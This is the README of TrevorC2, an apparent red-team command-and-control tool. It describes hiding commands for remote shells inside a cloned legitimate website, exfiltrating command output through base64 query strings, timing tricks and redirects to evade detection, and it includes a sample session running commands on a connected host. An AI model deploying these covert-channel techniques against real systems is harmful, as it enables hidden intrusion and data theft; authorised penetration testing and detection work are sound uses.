trevorc2
=======

# TrevorC2 - Command and Control via Legitimate Behavior over HTTP

Written by: Dave Kennedy (@HackingDave)
Website: https://www.trustedsec.com

Note that this is a very early release - heavy randomization and encryption to be added soon.

TrevorC2 is a client/server model for masking command and control through a normally browsable website. Detection becomes much harder as time intervals are different and does not use POST requests for data exfil. 


           ,  .'''''.  ...    ''''',  .'           
            ','     ,.MMMM;.;'      '.             
             ;;    ;MMMMMMMMM;     ;;'             
            :'M:  ;MMMMMMMMMMM;.  :M':             
            : M:  MMMMMMMMMMMMM:  :M  .           
           .' M:  MMMMMMMMMMMMM:  :M. ;           
           ; :M'  :MMMMMMMMMMMM'  'M: :           
           : :M: .;"MMMMMMMMM":;. ,M: :           
           :  ::,MMM;.M":::M.;MMM ::' :           
         ,.;    ;MMMMMM;:MMMMMMMM:    :,.         
         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM         
         M':''':MMMMMMMMM;MMMMMMMM: "': M         
         M.:   ;MMMMMMMMMMMMMMMMMM;   : M         
         :::   MMMMMMMMMMM;MMMMMMMM   ::M         
        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".         
      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.       
     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '     
     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.     
     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:     
     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:     
      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM       
      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:       
       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM       
       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:       
        :M: :    MMMMMMMMM'MMMMMM'   : :MM'       
        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"         
         'M  :    ""''':;;;'''""    :  M:         
         ;'  :     "MMMMMMMM;."     :  "".         
       ,;    :      :MMMMMMM:;.     :    '.       
      :'     :    ,MM'''""''':M:    :     ';       
     ;'      :    ;M'         MM.   :       ;.     

There are two components to TrevorC2 - the client and the server. The client can be configured to be used with anything. In this example it's coded in Python but can easily be ported to C#, PowerShell, or whatever you want. Currently the trevorc2_client.py supports Windows, MacOS, and Linux. You can always byte compile the Windows one to get an executable, but preference would be to use Windows without having to drop an executable as a stager.

The way that the server works is by tucking away a parameter thats right before the </body> parameter. This is completely configurable, and it's recommended you configure everything to be unique in order to evade detection. Here is the workflow:

    1. trevor2_server.py - edit the file first, and customize, what website you want to clone, etc. The server will clone a website of your choosing and stand up a server. This server is browsable by anyone and looks like a legitimate website. Contained within the source is parameter that (again is configurable), which contains the instructions for the client. Once a client connects, it searches for that parameter, then uses it to execute commands.
    2. trevor2_client.py - all you need in any configurable option is the ability to call out to a website, parse some basic data, and then execute a command and then put the results in a base64 encoded query string parameter to the site. That's it, not hard. 
    3. trevor2_client.ps1 - powershell implementation of trevor2_client.py, this allows you to use native PowerShell to interact with Trevor2_Server.

## Installation

pip install -r requirements.txt

## Usage

First edit the trevor2_server.py - change the configuration options and site to clone.

python trevor2_server.py

Next, edit the trevor2_client.py or ps1 - change the configuration and system you want it to communicate back to. 

python trevor2_client.py or .\trevor2_client.ps1

## Session Management

TrevorC2 supports the ability to handle multiple shells coming from different hostnames. The way TrevorC2 works is it will identify new hostnames as sessions. You can interact with the sessions once you execute a command. If you have multiple sessions, you can type a command and interact with that session based on the session number stored globally. 

When first starting TrevorC2, you can type help or ? for additional information. Basic command usage is "list" which will list any active shells or none at all, or "interact <session_id>" to interact with the shell you want. 

You can always type back/exit within a shell, it will still remain active and not actually kill the shell.

Example below:

```
root@stronghold:/home/relik/Desktop/git/trevorc2# python trevorc2_server.py 

TrevorC2 - Legitimate Website Covert Channel
Written by: David Kennedy (@HackingDave)
https://www.trustedsec.com
[*] Cloning website: https://www.google.com
[*] Site cloned successfully.
[*] Starting Trevor C2 Server...
[*] Next, enter the command you want the victim to execute.
[*] Client uses random intervals, this may take a few.
[*] Type help for usage. Example commands, list, interact.

trevorc2>help
*** TrevorC2 Help Menu ***


Command Usage:

list - will list all shells available
interact <id> - allow you to select which shells to interact with

trevorc2>list

*** Available TrevorC2 Shells Below ***

No available TrevorC2 shells.

trevorc2>
*** Received connection from 127.0.0.1 and hostname stronghold for TrevorC2.

trevorc2>list

*** Available TrevorC2 Shells Below ***

Format: <session_id> <hostname>:<ipaddress>

1. stronghold:127.0.0.1 (Trevor C2 Established)


trevorc2>interact 1
[*] Dropping into trevorc2 shell...
[*] Use exit or back to select other shells
stronghold:trevorc2>ifconfig
[*] Waiting for command to be executed, be patient, results will be displayed here...
[*] Received response back from client...
=-=-=-=-=-=-=-=-=-=-=
(HOSTNAME: stronghold
CLIENT: 127.0.0.1)
ens33     Link encap:Ethernet  HWaddr 00:0c:29:63:7c:67  
          inet addr:172.16.37.132  Bcast:172.16.37.255  Mask:255.255.255.0
          inet6 addr: fe80::4b6b:fb52:f109:a7af/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1400907 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2588882 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:835091244 (835.0 MB)  TX bytes:2623070556 (2.6 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:453640 errors:0 dropped:0 overruns:0 frame:0
          TX packets:453640 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:211565776 (211.5 MB)  TX bytes:211565776 (211.5 MB)


stronghold:trevorc2>back
trevorc2>exit
[*] Exiting TrevorC2... 
```

## Dockerfile
Uses an alpine-based Dockerfile to deploy trevorC2, handy for quick deployment on cloud providers.  
Example below:

```bash
git clone https://github.com/trustedsec/trevorc2.git
cd trevorc2
# At this point, setting up docker-machine to remotly deploy works great
docker build -t trevorc2 . 
docker run -it -p 80:80 -p 443:443 trevorc2
```

## Variables configuration

It is important to change the variables that are presented in each of the scripts. Especially the SITE_PATH_QUERY and encryption key. I would also recommend looking at the REDIRECT option. Instead of cloning a website, you have another option which will redirect the victim host that may be browsing the site to investigate to the legitimate site. Basically when someone visits the site, it'll just redirect them to the site you want cloned. Change the cloned site from google for example to a different site and turn redirect to ON.

## TODO

#### Add ability for longer than 2048 data output. Query string parameter length limited size length.
#### Add do_POST support for POST exfil on longer data.
#### Add upload/download functionality.
